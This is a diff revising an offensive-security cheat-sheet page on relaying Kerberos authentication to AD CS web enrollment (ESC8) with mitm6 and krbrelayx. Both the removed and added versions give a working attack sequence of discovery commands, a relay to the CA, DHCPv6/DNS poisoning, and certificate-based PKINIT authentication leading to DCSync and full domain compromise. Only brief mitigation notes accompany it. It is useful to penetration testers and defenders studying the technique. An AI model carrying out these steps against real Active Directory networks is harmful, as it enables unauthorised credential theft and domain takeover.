@@ -1,137 +1,67 @@
-### Overview
+**mitm6 Kerberos relay to ESC-8** — abuse IPv6 DNS spoofing (mitm6) to make a victim (ideally a Domain Controller or high-privileged computer account) authenticate over Kerberos to a name you control, then relay that authentication with krbrelayx to the AD CS web-enrollment endpoint. The result is a certificate for the relayed machine account → PKINIT → often SYSTEM / DCSync.
 
-This attack abuses **IPv6 DNS spoofing** (mitm6) + **Kerberos relaying** (krbrelayx) to relay a machine account's Kerberos authentication to **Active Directory Certificate Services (AD CS)** HTTP enrollment endpoint. It leads to certificate enrollment as a high-privileged machine account → often **SYSTEM** code execution on the target.
+## Discovery
 
-**Requirements**:
-
-- Attacker on same VLAN/subnet (IPv6 enabled on victims).
-- AD CS with **Web Enrollment** (ESC8 vulnerable template).
-- No strong channel binding / always-sign on the HTTP endpoint.
-- Tools: mitm6 + krbrelayx (Dirk-jan Mollema).
-
-### Attack Flow (Markdown Sheet)
-
-#### Phase 1: Preparation
-
-```
-# Clone tools
-git clone https://github.com/dirkjanm/mitm6
-git clone https://github.com/dirkjanm/krbrelayx
-```
-
-Scan for vuln
+- Attacker on the same VLAN/subnet with IPv6 reachable on victims.
+- AD CS with Web Enrollment (ESC8) and no EPA / channel binding on the HTTP endpoint.
+- Confirm the CA / ESC8 exposure - see [ADCS Configuration Issues (ESC1-8)](../../ADCS%20Attacks/ADCS%20Configuration%20Issues%20%28ESC1-8%29.md):
 
 ```bash
-certipy find -u username@domain.local -p password -dc-ip <DC-IP> -stdout
-```
-or: 
-```
-netexec ldap <DC-IP> -u username -p password -M adcs
-```
 
-from windows host:
+certipy find -u 'USER_NAME@DOMAIN' -p 'USER_PASS' -dc-ip 'DC_IP' -stdout
+# or
+netexec ldap 'DC_IP' -u 'USER_NAME' -p 'USER_PASS' -M adcs
 
 ```
-certutil -dump
-```
 
-#### Phase 2: Start krbrelayx (Relay Target = AD CS)
+## Exploitation
 
-The default Web Enrollment endpoint is almost always:
+Two terminals: krbrelayx targets the CA, mitm6 poisons DNS so the victim resolves an attacker-controlled name and authenticates via Kerberos.
 
-```
-http://<CA-SERVER>/certsrv
-https://<CA-SERVER>/certsrv
-```
-
-Point relay to it:
+1. Start the relay to the AD CS enrollment endpoint:
 
 ```bash
-sudo python3 krbrelayx.py \
-  -t http://ca-server.domain.local/certsrv \
-  --victim dc01.domain.local \     # Optional: specific victim
-  -i eth0 \                        # Interface
-  --adcs                           # Enable AD CS specific handling
-```
 
-**Flags explained**:
-
-- -t: Target enrollment endpoint (ESC8).
-- --victim: (optional) Specific hostname to target.
-- -i: Interface to bind listeners (SMB/HTTP/DNS).
-
-#### Phase 3: Start mitm6 (IPv6 DNS Poisoning)
-
-Bash
+krbrelayx.py -t 'http://CA_FQDN/certsrv/' -ip 'ATTACKER_IP' --victim 'VICTIM_FQDN' --adcs --template 'Machine'
 
 ```
-# In a second terminal
-sudo python3 mitm6/mitm6.py \
-  -i eth0 \
-  -d domain.local \                # Domain to poison
-  --relay-target ca-server.domain.local   # Optional
-```
 
-mitm6 will:
+2. Start mitm6 (second terminal) to become the victim's DNS via rogue DHCPv6:
 
-- Respond to DHCPv6.
-- Become the primary DNS server for victims.
-- Force SOA queries → trigger Kerberos auth.
+```bash
 
-#### Phase 4: Wait for Victim Authentication
-
-- A machine (ideally Domain Controller or high-priv computer account) will send a **Kerberos AP-REQ**.
-- krbrelayx captures and **relays** it to the AD CS endpoint.
-- You receive a certificate for the relayed account (e.g., DC01$).
-
-#### Phase 5: Use the Certificate
-
-Bash
+mitm6 -d 'DOMAIN' --host-allowlist 'VICTIM_FQDN'
 
 ```
-# Example: Request certificate via certipy or manually
-certipy req -u 'dc01$' -p '' -ca 'CA_NAME' -target ca-server.domain.local
 
-# Or use the relayed session directly in krbrelayx if configured for auto-enroll
-```
+**Note:** the relay target is set on **krbrelayx** (`-t`), not on mitm6 - mitm6 only poisons name resolution. Scoping with `--host-allowlist` avoids poisoning the whole subnet.
 
-Common outcome:
+3. Wait for (or coerce) the victim's Kerberos `AP-REQ`; krbrelayx relays it and saves the issued certificate (e.g. `VICTIM$.pfx`).
 
-- Get a certificate for a Domain Controller machine account.
-- Use it with **Pass-the-Certificate** or Schannel to get a TGT.
-- DCSync / full domain compromise.
+4. Use the certificate with PKINIT to recover the NT hash / a TGT:
 
-### Full One-Liner Style (Parallel Execution)
+```bash
 
-Bash
+certipy auth -pfx './VICTIM$.pfx'
+# then DCSync if it was a DC - see below
 
 ```
-# Terminal 1
-python3 krbrelayx/krbrelayx.py -t http://ca.domain.local/certsrv -i eth0
 
-# Terminal 2
-sudo python3 mitm6/mitm6.py -i eth0 -d domain.local
-```
+A DC machine-account certificate → DCSync → full domain compromise, see [Dump NTDS.dit](../../Credential%20Dumping/Dump%20NTDS.dit.md).
 
-### Success Indicators
+## Caution
 
-- krbrelayx shows: [*] Got Kerberos ticket from ... relaying to AD CS
-- You receive a .pfx certificate for the machine account.
-- High success rate against default Windows IPv6 configurations.
+- Noisy: rogue DHCPv6 + a flood of SOA/AAAA queries. Prefer `--host-allowlist` to limit blast radius.
+- Defender fixes: disable IPv6 if unused or apply RA-Guard; enable EPA + require HTTPS on AD CS web enrollment.
 
-### Detection / Mitigation Notes
+## References
 
-- Monitor for unusual DHCPv6 + SOA queries.
-- Disable IPv6 if not needed, or use RA Guard / IPv6 ACLs.
-- Enable **Extended Protection for Authentication** and strong channel binding on AD CS.
-- Require signing on LDAP/SMB/HTTP where possible.
+- Dirk-jan Mollema - Relaying Kerberos over DNS with krbrelayx and mitm6 - https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
+- krbrelayx - https://github.com/dirkjanm/krbrelayx
+- mitm6 - https://github.com/dirkjanm/mitm6
 
-**References / Original Research**:
+## See also
 
-- Dirk-jan Mollema – [Relaying Kerberos over DNS using krbrelayx and mitm6](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
-
-### See also
-
-- [NTLM Relay to ADCS](../NTLM%20Relay/NTLM%20Relay%20to%20ADCS.md) - the general (non-Kerberos) NTLM-relay-to-ADCS / ESC8 flow.
+- [Kerberos Relay to ADCS](../Kerberos%20Relay/Kerberos%20Relay%20to%20ADCS.md) - the local / coerced / remote (non-mitm6) variants.
+- [NTLM Relay to ADCS](../NTLM%20Relay/NTLM%20Relay%20to%20ADCS.md) - the NTLM ESC8 flow.
 - [DHCP Poisoning](../NTLM%20Relay/DHCP%20Poisoning.md) - the IPv6/mitm6 front-end used here.
-- [NTLM Relay](../NTLM%20Relay/NTLM%20Relay.md) - relay overview and other targets.
